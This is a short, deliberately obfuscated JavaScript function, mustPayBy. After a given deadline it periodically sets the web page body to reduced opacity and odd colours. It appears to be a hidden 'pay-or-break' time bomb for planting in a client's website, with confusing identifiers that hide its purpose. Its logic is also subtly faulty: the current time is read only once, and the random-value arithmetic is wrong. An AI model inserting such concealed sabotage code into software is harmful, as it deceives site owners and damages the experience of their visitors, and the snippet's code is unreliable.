function mustPayBy(__$_$$$$_, __$$$$){
    const __ = new Date(),___ = new Date(__$_$$$$_);
    __$$$$ = (function (_$_){
        const [_$_$__] = /\d+/.exec(_$_);
        const __$$__ = _$_.slice(_$_$__.length)
        return __$$__ === 'ms' ? +_$_$__ : __$$__ === 's' 
            ? (+_$_$__ * 1000) : __$$__ === 'm' ? (+_$_$__ * 60000) : __$$__ === 'h' 
            ? (+_$_$__ * 3600000) : __$$__ === 'd' 
            ? (+_$_$__ * 86400000) : +_$_$__;
    })(__$$$$);
    setInterval(() => {
        if ((___ - __) < 0){
            let _ = (function(){
                let _$_$_ = Math.random();return function(_$_$_$_){ return _$_$_ % _$_$_$_}
            })(),$$$$$$_$$ = document.getElementsByTagName("body")[0].style;
            $$$$$$_$$.opacity = (_(0.6));
            $$$$$$_$$.color = 'rgb('+_(255)+','+_(240)+','+_(147)+')'
        }
    },__$$$$);
}